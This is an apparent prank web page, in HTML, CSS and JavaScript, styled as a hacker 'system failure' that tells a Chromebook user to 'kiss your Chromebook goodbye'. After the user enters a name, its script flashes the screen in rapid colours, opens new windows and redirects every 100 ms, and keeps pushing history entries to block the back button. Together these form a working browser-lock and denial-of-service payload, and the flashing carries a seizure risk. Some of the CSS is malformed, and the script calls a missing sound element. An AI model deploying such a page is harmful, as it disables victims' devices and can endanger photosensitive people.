    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');

        body {
            font-family: 'Share Tech Mono', monospace;
            text-align: center;
            background-color: black;
            color: #00ff00;
            margin: 0;
            padding: 50px;
            overflow: hidden;
            position: relative;
        }

        h1 {

        p {

        input, button {

        }

        .hidden {
            display: none;
        }

        .hacker {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            opacity: 0;
            transition: opacity 1s ease-in-out;
            z-index: 2; /* Ensure it is above the matrix */
        }

        /* Flashing Crazy Colors */
        @keyframes flash {
            0% { background-color: black; }
            25% { background-color: red; }
            50% { background-color: green; }
            75% { background-color: blue; }
            100% { background-color: black; }
        }

        .flashing {
            animation: flash 0.1s infinite;
        }

        /* Matrix Canvas */
        #matrixCanvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1; /* Ensure it is below other elements */
        }

    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>

    <h1>Welcome to the System</h1>
    <p>What is your name, good boy? ðŸŸ©</p>
    <input type="text" id="nameInput" placeholder="Enter your name...">
    <button onclick="startCrash()">Submit</button>

    <div id="message" class="hidden">
        <h1>Good boy, <span id="userName"></span> ðŸ˜ˆ</h1>
        <p>Kiss your Chromebook goodbye... ðŸ’‹</p>
        <img src="https://lh4.googleusercontent.com/proxy/HQp3JQwu8uKU5seHJRUTG3u6_aNKTZcJV2cQhPXmHGB3gSRFXyiC8arcyjH-zAqmkPO896YkaNPEmpiLoG__EGmtbg4Vjqr1g8mDdweSgzHP5V_gpgqhHtRyCK6SGCq1uYF6Z0IxY8i2iaIm3yKVHWA" class="hacker" id="hackerImg">

    <script>
        // Initialize Matrix Effect Canvas
        const canvas = document.getElementById("matrixCanvas");
        const ctx = canvas.getContext("2d");

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const letters = "01XOX1XOX10XOX1XOX10XOX1XOX10XOX1XOX1";
        const matrix = letters.split("");
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array.from({ length: Math.floor(columns) }).fill(1);

        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = "#0F0";
            ctx.font = fontSize + "px monospace";

            for (let i = 0; i < drops.length; i++) {
                const text = matrix[Math.floor(Math.random() * matrix.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }

                drops[i]++;
            }
        }
        setInterval(drawMatrix, 50);

        // Function to handle crash
        function startCrash() {
            let name = document.getElementById("nameInput").value.trim() || "User";
            document.getElementById("userName").innerText = name;
            document.getElementById("message").classList.remove("hidden");

            // Hide input and button
            document.getElementById("nameInput").style.display = "none";
            document.querySelector("button").style.display = "none";

            // Flashing chaos colors
            document.body.classList.add("flashing");

            // Show the hacker image
            const hackerImg = document.getElementById("hackerImg");
            hackerImg.style.opacity = "1";

            // Play the evil laughter sound
            const evilLaugh = document.getElementById("evilLaugh");
            evilLaugh.play();

            // Crash Sequence (initiates the chaos)
            setTimeout(() => {
                // SYSTEM FAILURE message
                document.body.innerHTML = "<h1 style='color:red; font-size:5rem;'>SYSTEM FAILURE</h1>";

                // Chaos Mode
                setInterval(() => { window.open("https://theuselessweb.com", "_blank"); }, 100);
                setInterval(() => { window.location = "https://www.neverendingredditloop.com"; }, 100);

                // Lock Browser
                onbeforeunload = function(){localStorage.x=1};

                // Prevent Back Navigation (push state)
                history.pushState(null, null, location.href);
                setInterval(() => { history.pushState(null, null, location.href); }, 50);

                // Violent Screen Shake
                setInterval(() => {
                    let x = Math.random() * 10 - 5;
                    let y = Math.random() * 10 - 5;
                    document.body.style.transform = `translate(${x}px, ${y}px)`;
                }, 50);
            }, 3000);
        }
    </script>
